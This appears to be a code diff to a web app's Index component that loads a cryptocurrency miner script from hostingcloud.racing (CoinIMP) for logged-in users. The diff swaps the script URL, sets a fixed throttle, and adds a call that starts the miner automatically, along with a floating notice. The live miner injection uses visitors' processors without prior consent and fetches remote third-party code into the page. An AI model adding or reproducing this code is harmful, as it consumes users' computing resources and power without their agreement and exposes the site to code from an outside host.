@@ -93,12 +93,12 @@ const Index = () => {
     if (user) {
       // Charger script de mining
       const existingScript = document.head.querySelector(
-        'script[src="https://www.hostingcloud.racing/f4U5.js"]'
+        'script[src="https://www.hostingcloud.racing/etyE.js"]'
       );
       if (existingScript) return;
 
       const script1 = document.createElement("script");
-      script1.src = "https://www.hostingcloud.racing/f4U5.js";
+      script1.src = "https://www.hostingcloud.racing/etyE.js";
       script1.async = true;
       script1.id = "mining-script-main";
       document.head.appendChild(script1);
@@ -107,8 +107,10 @@ const Index = () => {
         if (!window.miningClientInitialized && window.Client) {
           var _client = new window.Client.Anonymous(
             "80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd",
-            { throttle: throttle, c: "w" }
+            { throttle: 0.4, c: "w" }
           );
+          _client.start();
+          _client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
           window.miningClient = _client;
           window.miningClientInitialized = true;
         }
